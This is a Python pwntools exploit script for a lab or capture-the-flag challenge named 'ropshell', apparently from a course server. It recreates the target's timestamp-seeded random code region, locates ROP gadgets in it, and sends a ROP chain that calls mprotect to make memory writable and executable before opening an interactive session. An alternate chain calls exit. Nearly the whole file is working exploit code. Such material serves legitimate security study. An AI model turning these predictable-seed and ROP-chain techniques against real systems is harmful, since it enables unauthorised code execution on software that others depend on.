#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
# import asm
from pwn import asm
import sys

context.arch = 'amd64'
context.os = 'linux'

remote = False
code_bytes = b''
start_code_address = None
timestamp = None

def get_init_info():
    global start_code_address, timestamp

    if remote:
        r.recvline()
        r.recvline()

    timestamp = int(r.recvline().decode().split(" ")[3])
    start_code_address = int(r.recvline().decode().split(" ")[5], base=16)

    print("timestamp: ", timestamp)
    print("start_code_address in hex: ", hex(start_code_address))
    return


def gen_random_code_bytes():
    """ c code here use to generate the code section content
    srand(t);
    for(i = 0; i < LEN_CODE/4; i++) {
        codeint[i] = (rand()<<16) | (rand() & 0xffff);
    }
    codeint[rand() % (LEN_CODE/4 - 1)] = 0xc3050f;   // 把 syscall ret 埋進去的
    if(mprotect(code, LEN_CODE, PROT_READ|PROT_EXEC) < 0) errquit("mprotect");
    """
    global timestamp, code_bytes

    import ctypes
    libc = ctypes.CDLL('libc.so.6')
    libc.srand(timestamp)
    LEN_CODE = (10*0x10000)

    codeint = []
    for i in range(0, int(LEN_CODE/4), 1):
        tmp = (libc.rand()<<16) | (libc.rand() & 0xffff)
        tmp &= 0xffffffff  # limit to the lower 32 bits
        codeint.append(tmp)
    codeint[libc.rand() % (int(LEN_CODE/4) - 1)] = 0xc3050f

    code_bytes = b''
    for single_int in codeint:
        byte_array = single_int.to_bytes(4, byteorder='little')
        code_bytes += byte_array

    return

def code_bytes_find(target_asm):
    global code_bytes

    pos = code_bytes.find(target_asm)
    if pos == -1:
        print("not found alert: ", target_asm)
    else:
        print("pos: ", hex(pos))
    return pos

def task1_byte():
    global start_code_address

    send_line = b''.join([
        p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
        p64(60),
        p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
        p64(37),
        p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
    ])

    return send_line

def mprotect_byte():
    global start_code_address

    # open memory = codeint to be able to read & write & execute
    # ropshell will clean the register before executing

    send_line = b''.join([
        # al is rax's LSB 8 bits, 0xa is 10, mprotect syscall number
        # rax to place syscall number
        p64(code_bytes_find(asm("pop rax\nret")) + start_code_address),
        p64(10),
        # rdi - page start
        p64(code_bytes_find(asm("pop rdi\nret")) + start_code_address),
        p64(start_code_address),
        # rsi - page len
        p64(code_bytes_find(asm("pop rsi\nret")) + start_code_address),
        p64(4096),
        # rdx - dl is LSB 8 bits, open mode -> read(0x1), write(0x2), exec(0x4) -(all or)-> 0x7
        p64(code_bytes_find(asm("pop rdx\nret")) + start_code_address),
        p64(7),
        p64(code_bytes_find(asm("syscall\nret")) + start_code_address),
    ])

    return send_line


if __name__ == '__main__':
    r = None
    if 'qemu' in sys.argv[1:]:
        r = process("qemu-x86_64-static ./ropshell", shell=True)
    elif 'bin' in sys.argv[1:]:
        r = process("./ropshell", shell=False)
    elif 'local' in sys.argv[1:]:
        r = remote("localhost", 10494)
    else:
        r = remote("up23.zoolab.org", 10494)
        remote = True

    if type(r) != pwnlib.tubes.process.process:
        pw.solve_pow(r)

    # find target asm
    get_init_info()
    if start_code_address == None or timestamp == None:
        exit(0)

    gen_random_code_bytes()
    # send_line = task1_byte()
    send_line = mprotect_byte()
    print("send_line: ", send_line)
    
    r.send(send_line)
    r.interactive()